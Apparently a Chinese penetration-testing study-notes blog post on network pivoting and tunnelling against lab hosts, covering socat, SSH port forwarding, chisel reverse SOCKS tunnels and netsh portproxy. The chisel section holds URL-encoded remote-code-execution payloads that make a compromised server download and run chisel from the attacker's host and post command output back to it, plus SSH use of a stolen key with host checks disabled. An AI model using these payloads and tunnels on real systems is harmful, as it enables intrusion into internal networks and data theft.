@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="使用socat进行转发被控机器执行 1socat -ddd TCP-LISTEN:本地监听端口,fork TCP:内网目标机器:目标端口  SSH隧道搭建SSH端口本地端口转发1234567# 被控机器运行# 0.0.0.0:4455是ssh client的地址和端口# 172.16.50.217:445是目的IP和端口# database_admin@10.4.50.215是ssh server">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tunnel Technology">
+<meta property="og:url" content="http://example.com/2024/06/05/Tunnel-Technology/index.html">
+<meta property="og:site_name" content="B00ze Escape">
+<meta property="og:description" content="使用socat进行转发被控机器执行 1socat -ddd TCP-LISTEN:本地监听端口,fork TCP:内网目标机器:目标端口  SSH隧道搭建SSH端口本地端口转发1234567# 被控机器运行# 0.0.0.0:4455是ssh client的地址和端口# 172.16.50.217:445是目的IP和端口# database_admin@10.4.50.215是ssh server">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/05/26/iHdG7UNCjYJtTqP.png">
+<meta property="og:image" content="https://s2.loli.net/2024/06/05/e3fn2U6WlSXYgF7.png">
+<meta property="article:published_time" content="2024-06-05T06:36:06.000Z">
+<meta property="article:modified_time" content="2024-06-05T06:44:52.789Z">
+<meta property="article:author" content="yu1e">
+<meta property="article:tag" content="Pentest">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/05/26/iHdG7UNCjYJtTqP.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Tunnel Technology</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/06/05/Password-Attack/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/06/05/Web-Application-Attack/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/Tunnel-Technology/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/Tunnel-Technology/&text=Tunnel Technology"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/Tunnel-Technology/&is_video=false&description=Tunnel Technology"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tunnel Technology&body=Check out this article: http://example.com/2024/06/05/Tunnel-Technology/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/Tunnel-Technology/&name=Tunnel Technology&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/Tunnel-Technology/&t=Tunnel Technology"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8socat%E8%BF%9B%E8%A1%8C%E8%BD%AC%E5%8F%91"><span class="toc-number">1.</span> <span class="toc-text">使用socat进行转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">SSH隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E7%AB%AF%E5%8F%A3%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.1.</span> <span class="toc-text">SSH端口本地端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.</span> <span class="toc-text">SSH动态端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.3.</span> <span class="toc-text">SSH远程端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.4.</span> <span class="toc-text">SSH远程动态端口转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8chisel%E5%BB%BA%E7%AB%8B%E9%9A%A7%E9%81%93"><span class="toc-number">3.</span> <span class="toc-text">使用chisel建立隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8netsh%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.</span> <span class="toc-text">使用netsh进行端口转发</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Tunnel Technology
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yu1e</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-05T06:36:06.000Z" class="dt-published" itemprop="datePublished">2024-06-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Pentest/" rel="tag">Pentest</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="使用socat进行转发"><a href="#使用socat进行转发" class="headerlink" title="使用socat进行转发"></a>使用socat进行转发</h2><p>被控机器执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat -ddd TCP-LISTEN:本地监听端口,fork TCP:内网目标机器:目标端口</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSH隧道搭建"><a href="#SSH隧道搭建" class="headerlink" title="SSH隧道搭建"></a>SSH隧道搭建</h2><h3 id="SSH端口本地端口转发"><a href="#SSH端口本地端口转发" class="headerlink" title="SSH端口本地端口转发"></a>SSH端口本地端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 被控机器运行</span><br><span class="line"># 0.0.0.0:4455是ssh client的地址和端口</span><br><span class="line"># 172.16.50.217:445是目的IP和端口</span><br><span class="line"># database_admin@10.4.50.215是ssh server的凭证（也就是内网机器）</span><br><span class="line">ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215</span><br><span class="line"></span><br><span class="line">#攻击机访问confluence机器的4455端口就可以smb连上内网的HRSHARES，前提是知道PGDATABASE01的ssh凭证</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://smms.app/image/iHdG7UNCjYJtTqP" target="_blank"><img src="https://s2.loli.net/2024/05/26/iHdG7UNCjYJtTqP.png" alt="ssh.png"></a></p>
+<h3 id="SSH动态端口转发"><a href="#SSH动态端口转发" class="headerlink" title="SSH动态端口转发"></a>SSH动态端口转发</h3><p>被控机器执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215</span><br></pre></td></tr></table></figure>
+
+<p>相当于被控机器就是sock代理，<a href="mailto:&#x64;&#x61;&#x74;&#x61;&#x62;&#x61;&#x73;&#101;&#95;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#49;&#x30;&#x2e;&#52;&#x2e;&#53;&#48;&#46;&#x32;&#49;&#53;">&#x64;&#x61;&#x74;&#x61;&#x62;&#x61;&#x73;&#101;&#95;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#49;&#x30;&#x2e;&#52;&#x2e;&#53;&#48;&#46;&#x32;&#49;&#53;</a>是内网主机的SSH</p>
+<p>这种方法的前提是知道PGDATABASE01的ssh口令</p>
+<p>然后修改&#x2F;etc&#x2F;proxychains4.conf为被控机器的9999端口，使用proxychains连接</p>
+<p><a href="https://smms.app/image/e3fn2U6WlSXYgF7" target="_blank"><img src="https://s2.loli.net/2024/06/05/e3fn2U6WlSXYgF7.png" ></a></p>
+<h3 id="SSH远程端口转发"><a href="#SSH远程端口转发" class="headerlink" title="SSH远程端口转发"></a>SSH远程端口转发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># kali@192.168.118.4是攻击机的ssh</span><br><span class="line"># 10.4.50.215:5432是目标机器</span><br><span class="line"># 如果要连目标机器的5432端口，攻击机直接访问本机的2345端口</span><br><span class="line"></span><br><span class="line"># Kali开启ssh</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line">ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSH远程动态端口转发"><a href="#SSH远程动态端口转发" class="headerlink" title="SSH远程动态端口转发"></a>SSH远程动态端口转发</h3><p>被控机器执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># kali@192.168.118.4是攻击机的ssh</span><br><span class="line">ssh -N -R 9998 kali@192.168.118.4</span><br><span class="line">ssh -f -N -R 1080 -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; -i /var/lib/mysql/.ssh/id rsa kali@KaliIP</span><br></pre></td></tr></table></figure>
+
+<p>攻击机直接挂proxychains修改代理为本地的9998</p>
+<h2 id="使用chisel建立隧道"><a href="#使用chisel建立隧道" class="headerlink" title="使用chisel建立隧道"></a>使用chisel建立隧道</h2><p>方法一</p>
+<p>先将chisel上传到目标服务器上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.231.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.192/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/</span><br><span class="line"></span><br><span class="line"># 实际上就是被控机器执行命令</span><br><span class="line">wget 192.168.118.4/chisel -O /tmp/chisel &amp;&amp; chmod +x /tmp/chisel</span><br></pre></td></tr></table></figure>
+
+<p>然后攻击机执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server --port 8080 --reverse</span><br></pre></td></tr></table></figure>
+
+<p>随后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -nvvvXi tun0 tcp port 8080</span><br></pre></td></tr></table></figure>
+
+<p>然后执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.231.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.192:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.45.192:8080/%27%29.start%28%29%22%29%7D/</span><br><span class="line"></span><br><span class="line"># 实际上就是执行，R表示反向socks隧道默认port 1080</span><br><span class="line">/tmp/chisel client 192.168.118.4:8080 R:socks &gt; /dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>然后攻击机安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ncat</span><br><span class="line"></span><br><span class="line"># database_admin@10.4.50.215是内网机器</span><br><span class="line">ssh -o ProxyCommand=&#x27;ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p&#x27; database_admin@10.4.50.215</span><br></pre></td></tr></table></figure>
+
+<p>方法二</p>
+<p>kali搭建chisel服务端</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel server -p 4040 --reverse</span><br></pre></td></tr></table></figure>
+
+<p>Windows运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chisel.exe client 目标IP:4040 R:socks</span><br></pre></td></tr></table></figure>
+
+<p>然后使用proxychain配置socks5代理，然后扫内网</p>
+<h2 id="使用netsh进行端口转发"><a href="#使用netsh进行端口转发" class="headerlink" title="使用netsh进行端口转发"></a>使用netsh进行端口转发</h2><p>windows上（需要管理员权限）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh interface portproxy add v4tov4 listenport=8080 listenaddress=本地IP地址 connectport=80 connectaddress=目标IP地址</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a href="/tags/">标签</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li>
+        
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8socat%E8%BF%9B%E8%A1%8C%E8%BD%AC%E5%8F%91"><span class="toc-number">1.</span> <span class="toc-text">使用socat进行转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSH%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">SSH隧道搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E7%AB%AF%E5%8F%A3%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.1.</span> <span class="toc-text">SSH端口本地端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.2.</span> <span class="toc-text">SSH动态端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.3.</span> <span class="toc-text">SSH远程端口转发</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH%E8%BF%9C%E7%A8%8B%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">2.4.</span> <span class="toc-text">SSH远程动态端口转发</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8chisel%E5%BB%BA%E7%AB%8B%E9%9A%A7%E9%81%93"><span class="toc-number">3.</span> <span class="toc-text">使用chisel建立隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8netsh%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">4.</span> <span class="toc-text">使用netsh进行端口转发</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/Tunnel-Technology/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/Tunnel-Technology/&text=Tunnel Technology"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/Tunnel-Technology/&is_video=false&description=Tunnel Technology"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Tunnel Technology&body=Check out this article: http://example.com/2024/06/05/Tunnel-Technology/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/Tunnel-Technology/&title=Tunnel Technology"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/Tunnel-Technology/&name=Tunnel Technology&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/Tunnel-Technology/&t=Tunnel Technology"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2010-2024
+    yu1e
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yu1e">项目</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
